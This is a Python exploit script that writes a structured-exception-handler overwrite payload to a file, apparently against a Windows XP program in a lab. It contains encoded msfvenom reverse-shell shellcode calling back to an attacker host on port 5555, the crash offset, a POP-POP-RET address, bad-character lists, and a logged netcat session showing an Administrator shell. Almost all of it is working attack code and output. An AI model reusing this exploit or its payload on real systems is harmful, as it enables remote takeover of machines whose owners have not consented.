#!/usr/bin/python
#CRASH at 3000BYTES overwrite SEH handler

#root@kali:~/Desktop# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.187] from (UNKNOWN) [192.168.11.177] 1088
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\Administrator\My Documents\My Music>



#root@kali:~# /usr/bin/msf-pattern_offset -q 37694136
#[*] Exact match at offset 260

#1001204F   5E               POP ESI
#10012050   5B               POP EBX
#10012051   C3               RETN

#badchar= "\x00\x0a\x0d"

badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

nseh="\xEB\x2E\x90\x90"
seh="\x4F\x20\x01\x10"

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.187 lport=5555 -f python -b "\x00\x0a\x0d"
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 10 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1684 bytes
buf =  ""
buf += "\xdb\xc5\xb8\xd4\x8f\x9d\xf9\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x42\x13\x03\x96\x9c\x7f"
buf += "\x0c\xea\x4b\xfd\xef\x12\x8c\x62\x79\xf7\xbd\xa2\x1d"
buf += "\x7c\xed\x12\x55\xd0\x02\xd8\x3b\xc0\x91\xac\x93\xe7"
buf += "\x12\x1a\xc2\xc6\xa3\x37\x36\x49\x20\x4a\x6b\xa9\x19"
buf += "\x85\x7e\xa8\x5e\xf8\x73\xf8\x37\x76\x21\xec\x3c\xc2"
buf += "\xfa\x87\x0f\xc2\x7a\x74\xc7\xe5\xab\x2b\x53\xbc\x6b"
buf += "\xca\xb0\xb4\x25\xd4\xd5\xf1\xfc\x6f\x2d\x8d\xfe\xb9"
buf += "\x7f\x6e\xac\x84\x4f\x9d\xac\xc1\x68\x7e\xdb\x3b\x8b"
buf += "\x03\xdc\xf8\xf1\xdf\x69\x1a\x51\xab\xca\xc6\x63\x78"
buf += "\x8c\x8d\x68\x35\xda\xc9\x6c\xc8\x0f\x62\x88\x41\xae"
buf += "\xa4\x18\x11\x95\x60\x40\xc1\xb4\x31\x2c\xa4\xc9\x21"
buf += "\x8f\x19\x6c\x2a\x22\x4d\x1d\x71\x2b\xa2\x2c\x89\xab"
buf += "\xac\x27\xfa\x99\x73\x9c\x94\x91\xfc\x3a\x63\xd5\xd6"
buf += "\xfb\xfb\x28\xd9\xfb\xd2\xee\x8d\xab\x4c\xc6\xad\x27"
buf += "\x8c\xe7\x7b\xe7\xdc\x47\xd4\x48\x8c\x27\x84\x20\xc6"
buf += "\xa7\xfb\x51\xe9\x6d\x94\xf8\x10\xe6\x5b\x54\x11\x4d"
buf += "\x33\xa7\x25\xa4\x77\x2e\xc3\xac\x67\x67\x5c\x59\x11"
buf += "\x22\x16\xf8\xde\xf8\x53\x3a\x54\x0f\xa4\xf5\x9d\x7a"
buf += "\xb6\x62\x6e\x31\xe4\x25\x71\xef\x80\xaa\xe0\x74\x50"
buf += "\xa4\x18\x23\x07\xe1\xef\x3a\xcd\x1f\x49\x95\xf3\xdd"
buf += "\x0f\xde\xb7\x39\xec\xe1\x36\xcf\x48\xc6\x28\x09\x50"
buf += "\x42\x1c\xc5\x07\x1c\xca\xa3\xf1\xee\xa4\x7d\xad\xb8"
buf += "\x20\xfb\x9d\x7a\x36\x04\xc8\x0c\xd6\xb5\xa5\x48\xe9"
buf += "\x7a\x22\x5d\x92\x66\xd2\xa2\x49\x23\xe2\xe8\xd3\x02"
buf += "\x6b\xb5\x86\x16\xf6\x46\x7d\x54\x0f\xc5\x77\x25\xf4"
buf += "\xd5\xf2\x20\xb0\x51\xef\x58\xa9\x37\x0f\xce\xca\x1d"

exploit="A"*(260-len(nseh)) + nseh + seh + "C"* 46 + buf +"D" * (3000-4-260-46-len(buf))
print exploit
f = open("poc.txt", "w")
f.write(exploit)
